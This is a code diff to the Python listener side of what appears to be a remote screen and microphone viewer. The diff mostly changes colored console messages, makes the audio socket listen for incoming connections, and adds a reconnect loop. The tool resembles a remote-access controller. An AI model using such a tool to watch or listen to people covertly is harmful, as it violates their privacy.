@@ -9,11 +9,12 @@ from os import system, path
 from threading import Thread
 from ctypes  import windll
 
+
 """ Functional """
 class Server:
     def __init__(self):
         self.HOST = socket.gethostbyname(socket.gethostname())
-        self.PORT = int(input("PORT: "))
+        self.PORT = int(input(f"ENTER PORT: "))
         system("cls")
 
     def build(self):
@@ -21,15 +22,15 @@ class Server:
         self.client_socket.bind(("", self.PORT))
         self.client_socket.listen(5)
 
-        print(f'{plus}Socket created')
-        print(f'{plus}Socket bind complete\n')
-        print(f"{plus}HOST - {self.HOST}\n{plus}PORT - {self.PORT}\n")
+        print(f'{plus}{wl}Socket created')
+        print(f'{plus}{wl}Socket bind complete\n')
+        print(f"{dol}{wl}HOST - {b}{self.HOST}\n{dol}{wl}PORT - {b}{self.PORT}\n")
 
     def sock_accept(self):
-        print(f'{mul}Socket now listening 🎲\n')
-        
+        print(f'{sharp}{wl}Socket now listening 🎲\n')
+
         self.conn, self.addr = self.client_socket.accept()
-        print(f"{dol}Connected - {wl}{self.addr[0]} ({self.addr[1]})")
+        print(f"{plus}{wl}Connected - {r}{self.addr[0]} ({self.addr[1]})\n\n{wl}")
 
     def get_screen(self):
         self.__running_micro = True
@@ -86,12 +87,15 @@ class Server:
                         frames_per_buffer=chunk)
 
         server_socket_m = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_socket_m.connect((self.HOST, PORT))
+        server_socket_m.bind(("", PORT))
+        server_socket_m.listen(5)
+        conn, addr = server_socket_m.accept()
+        
         while self.__running_micro:
             try:
-                data = server_socket_m.recv(32768)
-                if data == b"":
-                    continue
+                data = conn.recv(32768)
+                # if data == b"":
+                #     continue
                 stream.write(data,chunk)
             except:
                 self.__running_micro = False
@@ -105,15 +109,21 @@ r = Fore.LIGHTRED_EX
 m = Fore.LIGHTMAGENTA_EX
 y = Fore.LIGHTYELLOW_EX
 wl = Fore.LIGHTWHITE_EX
+b = Fore.LIGHTBLUE_EX
 w = Fore.WHITE
 
 plus = g + "[+] " + w
 minus = r + "[-] " + w
-mul = m + "[*] " + w
+sharp = m + "[#] " + w
 dol = y + "[$] " + w
 
 """ Start """
-server = Server()
-server.build()
-server.sock_accept()
-server.get_screen()
+while True:
+    try:
+        server = Server()
+        server.build()
+        server.sock_accept()
+        server.get_screen()
+        print(f"{minus}Disconnect")
+    except Exception as e:
+        print(e)
